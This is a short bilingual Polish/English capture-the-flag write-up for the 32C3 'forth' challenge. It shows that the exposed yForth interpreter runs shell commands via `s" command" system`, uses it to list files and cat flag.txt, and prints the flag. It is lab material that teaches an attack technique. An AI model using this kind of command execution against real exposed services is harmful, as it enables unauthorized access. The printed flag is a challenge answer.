##forth (pwn, 150p)

> connect to 136.243.194.49:1024 and get a shell.

###pl
[eng](#eng-version)

łącząc się z podanym serwerem dostajemy taką odpowiedź:

> yforth? v0.2  copyright (c) 2012  luca padovani

> this program comes with absolutely no warranty.

> this is free software, and you are welcome to redistribute it under certain conditions; see license for details.


forth pozwala nam na wykonanie systemowych komand za pomocą `s" komenda" system` (spacja przed komendą jest ważna)

spróbujmy zatem wyświetlić zawartość aktualnego katalogu:

>s" ls" system

>flag.txt  readme.gpl  run.sh  yforth

>ok

zobaczmy co się znajduje w pliku flag.txt:

>s" cat flag.txt" system

>32c3_a8cfc6174adcb39b8d6dc361e888f17b

>ok

zadanie gotowe!

###eng version

when connected to the server we get the following response: 

> yforth? v0.2  copyright (c) 2012  luca padovani

> this program comes with absolutely no warranty.

> this is free software, and you are welcome to redistribute it under certain conditions; see license for details.

forth allows system calls by calling `s" command" system` (notice the space before command)

let's view the insides of our current folder then:

>s" ls" system

>flag.txt  readme.gpl  run.sh  yforth

>ok

how about reading the flag.txt file?

>s" cat flag.txt" system

>32c3_a8cfc6174adcb39b8d6dc361e888f17b

>ok

challange complete!
